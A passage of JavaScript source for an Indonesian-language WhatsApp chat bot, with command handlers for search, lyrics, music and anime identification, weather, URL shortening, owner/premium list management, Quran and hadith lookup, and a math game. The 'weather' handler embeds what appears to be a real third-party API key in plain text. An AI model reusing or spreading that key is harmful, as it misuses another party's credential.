Fan.sendMessage(from, {image: gambar, caption: "Nih"  }, {quoted: setQuoted})
fs.unlinkSync(ahah) 
})
}catch(err){
console.log(err)
}
} else if (isQuotedTag || isQuotedReply) {
onlyWait()
let ghost = users 
let oppp = await Fan.profilePictureUrl(ghost, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let ini_gen = `${command}`
ameApi.generate(ini_gen, {
url : oppp
}).then(gambar => {
Fan.sendMessage(from, {image: gambar, caption: "Nih" }, {quoted: setQuoted})
}).catch(err => {
setReply(`${err}`)
});    
} else {
setReply("Tag atau Reply targetnya")
}
break
//━━━━━━━━━━━━━━━[ SARCH ]━━━━━━━━━━━━━━━━━//
case 'ghstalk':{
if (!q) return setReply("Masukan link")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let nana = await ghstalk(q)
console.log(nana)
let foto = nana.avatar_url
let gambar = await getBuffer(foto)
console.log(foto)
let toks =`
Nama: ${nana.name}
Bio: ${nana.bio}
Followers: ${nana.followers}
Following: ${nana.following}
Repository: ${nana.public_repos}
Created at: ${nana.created_at}
Update at: ${nana.updated_at}
Twitter: ${nana.twitter_username}
Email: ${nana.email}
Lokasi: ${nana.location}
Website: ${nana.blog}
Github url: ${nana.url}
`
console.log(toks)
await Fan.sendMessage(from, {image:gambar, caption: toks},{quoted: setQuoted})
}
break			
case 'lirik':{
if (args.length < 2) return setReply(`Kirim perintah ${command} judul lagu`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
ra.Musikmatch(q).then(async(data) => {
var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
Fan.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: setQuoted })
}).catch(() => setReply(`Judul lagu tidak ditemukan`))
}
break
case 'grupwa': 
if (!q) return setReply(`Kirim perintah ${command} nama grup`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
hxz.linkwa(q).then(async(data) => {
if (data.length == 0) return setReply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
}
setReply(teks)
}).catch(() => setReply(mess.error.api))
break
case 'yts':
try {
if (!q) return setReply('Format salah')
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
setReply('Tunggu sebentar')
let rus = await yts(q)
let  res = await rus.all.filter(v => v.type == 'video')
let videoID = res[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let a = `*Youtube Search 🔎*\n`
for (let i of res) {
a += `
📜 Title : ${i.title}
📈 Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
let b = a.trim()

let imag = await getBuffer(res[0].image)
let mok = [
{"buttonId": `${prefix}playmp3 ${res[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${res[0].url}`,"buttonText": {"displayText": `ᴠɪᴅᴇᴏ`},"type": "RESPONSE"}]
Fan.sendButImage(from, b, `Baterai : Not Detec\nfake`, imag, mok, {quoted: setQuoted})
} catch (e) {
console.log(e)
setReply(`${e}`)
}
break  
case 'whatmusic':
if (isQuotedAudio) {
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
Fan.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
})
} else if (isQuotedVideo) {
onlyWait()
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
Fan.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio atau video")
}
break
case 'whatanime':{
const FormData = require('form-data')
if (isImage || isQuotedImage) {       
let yoooo = await Fan.downloadAndSaveMediaMessage(quoted)
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(yoooo)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await Fan.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: setQuoted})
})    .catch((err) => {                   
setReply(mess.error.api)
})
} else if (isSticker || isQuotedSticker ) {
let yoooo = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return setReply('Gagal :V')   
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(ran)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await Fan.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: setQuoted})
fs.unlinkSync(ran)
})
.catch((err) => {       
setReply(mess.error.api)
})
})
} else {
setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
}
}
break
case 'google':{
if (!q) return setReply('masukan teks')
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
let ggs = require('google-it')
 ggs({ 'query': q }).then(results => {
let vars =``
vars += `_*Hasil Pencarian : ${q}*_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var lama = vars.trim()
setReply(lama)
})
}
break
case 'kbbi':{
if (args.length < 1) return setReply('Apa yang mau dicari um?')
let asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
setReply('Menurut Kbbi:\n\n'+asw.result)
}
break
case 'weather':{
if(!args[0]) setReply(" please provide place or location name")
try{
let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
let res = await response
let name = res.data.name
let Country = res.data.sys.country
let Weather= res.data.weather[0].description
let Temperature = res.data.main.temp + '°C'
let Minimum_Temperature= res.data.main.temp_min + '°C'
let Maximum_Temperature= res.data.main.temp_max + '°C'
let Humidity= res.data.main.humidity + '%'
let Wind= res.data.wind.speed + 'km/h'
setReply(`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`)
}catch(e){
setReply('Lokasi tidak di temukan, silakan masukan nama negara')
}
}
break
case 'kodepos':
try{
let nana = await kodepos(q)
console.log(nana)
let teks =`Berikut Daftar kode pos\nYang telah di temukan\n\n`
for (let i of nana){
 teks +=`Provinsi: ${i.province}\nKota: ${i.city}\nKecamatan: ${i.subdistrict}\nKabupanten: ${i.urban}\nKode Pos: ${i.postalcode}\n\n═════════════════\n\n`
}
setReply(teks)
} catch (err){
setReply("Kodepos tidak di temukan")
console.log(err)
}
break 
case 'kodebahasa':{
let LANGUAGES = `
*╭─❲ KODE BAHASA ❳*
*│*
*│▸* af: Afrikaans 
*│▸* sq: Albanian
*│▸* ar: Arabic
*│▸* hy: Armenian
*│▸* ca: Catalan 
*│▸* zh: Chinese 
*│▸* zh-cn: Chinese (Mandarin/China)
*│▸* zh-tw: Chinese (Mandarin/Taiwan)
*│▸* zh-yue: Chinese (Cantonese)
*│▸* hr: Croatian
*│▸* cs: Czech
*│▸* da: Danish
*│▸* nl: Dutch
*│▸* en: English    
*│▸* en-au: English (Australia)
*│▸* en-uk: English (United Kingdom)
*│▸* en-us: English (United States) 
*│▸* eo: Esperanto 
*│▸* fi: Finnish 
*│▸* fr: French
*│▸* de: German
*│▸* el: Greek 
*│▸* ht: Haitian Creole 
*│▸* hi: Hindi 
*│▸* hu: Hungarian 
*│▸* is: Icelandic 
*│▸* id: Indonesian 
*│▸* it: Italian
*│▸* ja: Japanese
*│▸* ko: Korean
*│▸* la: Latin
*│▸* lv: Latvian
*│▸* mk: Macedonian
*│▸* no: Norwegian
*│▸* pl: Polish
*│▸* pt: Portuguese
*│▸* pt-br: Portuguese (Brazil)
*│▸* ro: Romanian
*│▸* ru: Russian
*│▸* sr: Serbian
*│▸* sk: Slovak
*│▸* es: Spanish 
*│▸* es-es: Spanish (Spain)
*│▸* es-us: Spanish (United States)
*│▸* sw: Swahili
*│▸* sv: Swedish
*│▸* ta: Tamil
*│▸* th: Thai
*│▸* tr: Turkish
*│▸* vi: Vietnamese 
*│▸* cy: Welsh
*│*
*╰────────────⦁*`
setReply(LANGUAGES)
}
break 
case 'brainly':{
const { Brainly } = require("brainly-scraper-v2");
const brainly = new Brainly("id"); 
if (!q) setReply( 'Soalnya?')
let nana =`https://www.logosvgpng.com/wp-content/uploads/2018/04/brainly-logo-vector.png`
let foto = await getBuffer(nana)   
let res = await brainly.searchWithMT('id', `${q}`)
console.log(res)
let teks =`_*BRAINLY*_\n\n`


   teks += res.map(({ question, answers }, i) => `
_*PERTANYAAN KE ${i + 1}*_
${question.content}${answers.map((v, i) => `

*JAWABAN KE ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Terpilih)' : ''}
${v.content}`).join``}`).join(`
═════════════════
`)
 
 teks +=`\n\n_Thanks for choosing Brainly_`
 
let mok = [
{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
{"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
Fan.sendButImage(from, teks, fake, foto, mok, {contextInfo: forward})             
}
break
case 'wallpaper': {
if (!q) return setReply( 'Masukkan Query Title')
let anu = await wallpaper(q)
console.log(anu)
if(anu.length == "0") return setReply("Image tidak di temukan")
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: fake,
buttons: buttons,
headerType: 4
}
Fan.sendMessage(from, buttonMessage, { quoted: setQuoted })
}
break
//━━━━━━━━━━━━━━━[ SHORT URL ]━━━━━━━━━━━━━━━━━//
case 'tinyurl':{
if (args.length < 1) return setReply(`Masukkan link`)
if (!isUrl) return setReply(`Masukkan link`)
const fetchText = (url, optiono) => {
return new Promise((resolve, reject) => {
return fetch(url, optiono)
.then(response => response.text())
.then(text => resolve(text))
.catch(err => {
console.log(color(err,'red'))
reject(err)
})
})
}
let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
let shorti = `*Result : ${okok}*`
setReply(shorti)
}
break  
case 'bitly':{
if(!q) return setReply("Masukan link")
if(!isUrl) return setReply("Masukan link dengan benar")
try {
let result = await bitly.shorten(q);
setReply(`Link: ${result.link}\nCreated at: ${result.created_at}`)
} catch(e) {
setReply(`Url invalid`)
}
}
break;
case 'tourl': {
onlyWait()
let { UploadFileUgu} = require('./lib/uploader')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
if (isQuotedImage) {
let anu = await TelegraPh(media)
setReply(util.format(anu))
} else if (isQuotedVideo || isQuotedAudio || isQuotedSticker) {
let anu = await UploadFileUgu(media)
setReply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//━━━━━━━━━━━━━━━[ STORAGE ]━━━━━━━━━━━━━━━━━//
case 'adderror':
{
if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
if (!isOwner && !itsMe) return onlyOwner()
let oke = q.split("|")[0]
let oka = q.split("|")[1]
addError(oke, oka, listerror)
await setReply(`Sukses Menambahkan ${q} ke daftar error`)
}
break
case 'addstik':{
if (!isOwner && !itsMe) return onlyOwner()
if (!isQuotedSticker) return setReply('Reply stiker nya')
if (!q) return setReply('Nama sticker nya apa?')
let delb = await Fan.downloadAndSaveMediaMessage(quoted)
setiker.push(q) 
await fse.copy(delb, `./media/sticker/stick/${q}.webp`)
fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
}
break	
case 'addvn':{
if (!isOwner && !itsMe) return onlyOwner()
if (!isQuotedAudio) return setReply('Reply vnnya')
if (!q) return setReply('Nama audionya apa')
let delb = await Fan.downloadAndSaveMediaMessage(quoted)
audionye.push(q)
await fse.copy(delb,`./media/audio/${q}.mp3`)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break  
case 'addowner':
try{
if (!isOwner && !itsMe) return onlyOwner()
if (!Pe ) return setReply("Masukan nomer target")
if (Pe == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
if (isMiminya) return setReply("sudah menjadi owner kak")
Own.push(Pe)
fs.writeFileSync('./database/owner.json', JSON.stringify(Own))
setReply(`Succes add owner`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'addprem':
try{
if (!isOwner && !itsMe) return onlyOwner()
if (!Pe ) return setReply("Masukan nomer target")
if (Pe == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
if (isPremnya) return setReply("sudah menjadi premium kak")
Premium.push(Pe)
fs.writeFileSync('./database/premium.json', JSON.stringify(Premium))
setReply(`Succes add premium`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'delprem':
try{
if (!isOwner && !itsMe) return onlyOwner()
if (!Pe ) return setReply("Masukan nomer target")
if (!isPremnya) return setReply("tidak ada di database kak")
if (Pe == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
let delprem = Premium.indexOf(Pe)
Premium.splice(delprem, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(Premium))
setReply(`Succes delete user premium`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'delowner':
try{
if (!isOwner && !itsMe) return onlyOwner()
if (!Pe ) return setReply("Masukan nomer target")
if (!isMiminya) return setReply("tidak ada di database kak")
if (Pe == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
let delown = Own.indexOf(Pe)
Own.splice(delown, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(Own))
setReply(`Succes delete user owner`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'delerror':{
if (!isOwner && !itsMe) return onlyOwner()
listerror.splice(q, 1)
fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
setReply( `Sukses menghapus ${q} di daftar error`)
}
break
case 'delstik':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply("Masukan query")
try {
let wanu = setiker.indexOf(q)
setiker.splice(wanu,1)
fs.unlinkSync(`./media/sticker/stick/${q}.webp`)
fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
setReply(`Succes delete sticker ${q}!`)
} catch (err) {
console.log(err)
setReply(`Gagal delete sticker ${q}!`)
}
}
break
case 'delvn':{
if (!isOwner && !itsMe) return onlyOwner()
try {
let wanu = audionye.indexOf(q)
audionye.splice(wanu, 1)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
fs.unlinkSync(`./media/audio/${q}.mp3`)
setReply(`Sukses delete vn ${q}`)
} catch (err){
console.log(err)
setReply('eror kak')
}
}
break
case 'listerror': {
let errornye = `*List Error*\nJumlah : ${JSON.parse(fs.readFileSync('./database/listerror.json')).length}\n\n`
for (let i of JSON.parse(fs.readFileSync('./database/listerror.json'))){          
errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`             
} 
errornye += fake
setReply(errornye)
}
break
case 'liststik':{
let teks = '*Sticker list :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*`
setReply(teks)
}
break
case 'listvn':
{
let teks = '*List Vn:*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total ada : ${audionye.length}*`
teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
setReply(teks)
}
break
case 'listowner':
{
let teks = '┌──⭓「 *List Owner* 」\n│\n'
for (let awokwkwk of Own) {
teks += `│⭔ https://wa.me/${awokwkwk.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${Own.length}*`
setReply(teks)
}
break
case 'listprem':
{
let teks = '┌──⭓「 *List Premium* 」\n│\n'
for (let awokwkwk of Premium) {
teks += `│⭔ https://wa.me/${awokwkwk.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${Premium.length}*`
setReply(teks)
}
break
case 'listban':
if (!isOwner && !itsMe) return onlyOwner()
let banya = `*List Banned*\nJumlah : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}\n\n`
JSON.parse(fs.readFileSync('./database/banned.json')).map(function(e, i){
banya += (i+1)+`📲 Nomer : wa.me/${e.id}\n    📅 Tanggal : ${e.date}\n\n`            
});
setReply(banya)
break
case 'listblockcmd':{
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
setReply(wo)
}
break  
case 'clearallerror':
if (!isOwner && !itsMe) return onlyOwner()
setReply("Suksek clear all error")
clearAllError(listerror)
break 
case 'clearallban':
if (!isOwner && !itsMe) return onlyOwner()
setReply("Suksek clear all ban")
clearAllBan(ban)
break 
case 'clearallblock':{
if (!isOwner && !itsMe) return onlyOwner()
let obj = [] 
fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
await setReply(`ALL USER BLOCKED BERHASIL DI HAPUS`)
}
break 
case 'clearallUser':
if (!isOwner && !itsMe) return onlyOwner()
setReply("Suksek clear all User")
clearAllUser(user)
break
case 'clearallowner':
if (!isOwner && !itsMe) return onlyOwner()
clearAllOwner(Own) 
setReply(`BERHASIL MENGHAPUS SEMUA OWNER DI DATABASE`)
break  	
case 'clearallprem':
if (!isOwner && !itsMe) return onlyOwner()
clearAllPremium(Premium) 
setReply(`BERHASIL MENGHAPUS SEMUA USER PREMIUM`)
break  	
//━━━━━━━━━━━━━━━[ ISLAMIC ]━━━━━━━━━━━━━━━━━//
case 'hadis': {
if (!args[0]) return setReply( `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
if (!args[1]) return setReply( `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`)
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
setReply(`No. ${number}

${arab}

${id}`)
} catch (e) {
setReply(`Hadis tidak ditemukan !`)
}
}
break
case 'alquran': {
if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
Fan.sendMessage(from, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : setQuoted })
}
break
case 'tafsirsurah': {
if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
}
break
//━━━━━━━━━━━━━━━[ GAME ]━━━━━━━━━━━━━━━━━//
case 'math': {
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
let modes = {
noob: [-3, 3, -3, 3, '+-', 15000, 10],
easy: [-10, 10, -10, 10, '*/+-', 20000, 40],
medium: [-40, 40, -20, 20, '*/+-', 40000, 150],
hard: [-100, 100, -70, 70, '*/+-', 60000, 350],
extreme: [-999999, 999999, -999999, 999999, '*/', 99999, 9999],
impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 35000],
impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 30000, 50000]
}

let operators = {
  '+': '+',
  '-': '-',
  '*': '×',
  '/': '÷'
}

function genMath(mode) {
let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
let a = randomInt(a1, a2)
let b = randomInt(b1, b2)
let op = pickRandom([...ops])
let result = (new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`))()
if (op == '/') [a, result] = [result, a]
return {
